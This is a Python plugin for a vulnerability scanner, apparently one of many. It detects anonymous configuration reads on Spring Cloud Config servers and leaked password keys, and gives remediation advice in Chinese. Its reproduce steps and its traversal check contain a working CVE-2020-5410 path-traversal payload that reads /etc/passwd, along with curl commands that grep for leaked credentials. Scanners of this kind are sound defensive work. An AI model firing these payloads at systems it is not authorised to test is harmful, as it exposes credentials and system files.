# Spring Cloud Config 配置未授权读取（CVE-2020-5410 目录穿越作为附加证据）
import json

from common.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from plugins.base import PluginBase

_PASSWORD_KEYS = ("spring.datasource.password", "spring.redis.password")


class SpringCloudConfigPlugin(PluginBase):
    name = "Spring Cloud Config 配置未授权读取"
    cve = "N/A"
    severity = SEVERITY_HIGH
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    category = "vuln"
    description = "Spring Cloud Config 的 /{application}/{profile} 端点可匿名读取配置，可能泄露数据库、Redis 等连接信息"
    fix = "为 Spring Cloud Config 端点增加访问认证，或仅允许内网受信服务访问"
    fix_detail = (
        "【访问控制】在网关或反向代理层限制 /application/**、/{application}/{profile} 访问：\n"
        "  location ~ ^/(application|[^/]+/(default|prod)) { allow 10.0.0.0/8; deny all; }\n"
        "【认证】为配置中心增加统一认证（如 Spring Security Basic Auth 或网关鉴权）\n"
        "【网络】配置中心仅监听内网地址，不直接暴露到办公网/互联网\n"
        "【配置】敏感配置项使用环境变量或密钥管理服务注入，不写入可匿名读取的配置文件\n"
        "【升级】如使用受影响版本，升级 Spring Cloud Config 至 ≥2.2.3.RELEASE / ≥2.1.9.RELEASE\n"
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 1. 读取默认配置：\n"
        'curl -i "http://target/application/default"\n'
        'curl -i "http://target/application"\n'
        "\n"
        "# 预期响应（未授权）：HTTP/1.1 200，Content-Type: application/json，\n"
        '# 正文含 "propertySources" 且为非空数组\n'
        "\n"
        "# 2. 检查泄露的敏感键（仅确认键名，不复制值）：\n"
        'curl -s "http://target/application/default" | python -m json.tool | grep -E "datasource.password|redis.password"\n'
        "\n"
        "# 3. 附加验证 CVE-2020-5410 目录穿越：\n"
        'curl "http://target/..%252F..%252F..%252Fetc%252Fpasswd/default/master"\n'
        "  # 返回 200 且正文含 root: 时作为附加证据"
    )

    _CONFIG_PATHS = ("/application/default", "/application")

    @staticmethod
    def _parse_json(resp):
        try:
            return json.loads(resp.text or "")
        except (TypeError, ValueError):
            return None

    @staticmethod
    def _leaked_keys(payload):
        keys = set()
        for source in payload.get("propertySources", []):
            if not isinstance(source, dict):
                continue
            values = source.get("source")
            if not isinstance(values, dict):
                continue
            for key in _PASSWORD_KEYS:
                if key in values:
                    keys.add(key)
        return sorted(keys)

    def _traversal_evidence(self, target, session):
        url = join_url(target, "/..%252F..%252F..%252Fetc%252Fpasswd/default/master")
        try:
            resp = session.get(url)
            body = resp.text or ""
            if resp.status_code == 200 and "root:" in body:
                return "附加证据：CVE-2020-5410 目录穿越可读取 /etc/passwd"
        except Exception:
            return ""
        return ""

    def verify(self, target, session) -> ScanResult:
        """探测 Spring Cloud Config 未授权配置读取。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话
        @return: CONFIRMED（propertySources 非空）/ SAFE（明确无 propertySources）/ UNKNOWN（网络或解析失败）
        """
        got_response = False
        parse_failed = False
        confirmed_url = ""
        confirmed_payload = None

        for path in self._CONFIG_PATHS:
            url = join_url(target, path)
            try:
                resp = session.get(url)
            except Exception:
                continue
            got_response = True
            if resp.status_code != 200:
                continue
            if "json" not in (resp.headers.get("Content-Type") or "").lower():
                continue
            payload = self._parse_json(resp)
            if payload is None:
                parse_failed = True
                continue
            if not isinstance(payload, dict):
                parse_failed = True
                continue
            sources = payload.get("propertySources")
            if isinstance(sources, list) and len(sources) > 0:
                confirmed_url = url
                confirmed_payload = payload
                break

        if confirmed_payload is not None:
            evidence = "propertySources 非空"
            leaked = self._leaked_keys(confirmed_payload)
            if leaked:
                evidence += "；泄露键：" + ", ".join(leaked)
            traversal = self._traversal_evidence(target, session)
            if traversal:
                evidence += "；" + traversal
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=confirmed_url,
                evidence=evidence,
                fix=self.fix,
            )

        if not got_response or parse_failed:
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_UNKNOWN,
                url=join_url(target, self._CONFIG_PATHS[0]),
                evidence="配置端点无响应或 JSON 解析失败，无法判定",
            )

        return ScanResult(
            kind=self.category,
            name=self.name,
            severity=self.severity,
            status=STATUS_SAFE,
            url=join_url(target, self._CONFIG_PATHS[0]),
            evidence="未发现非空 propertySources",
        )
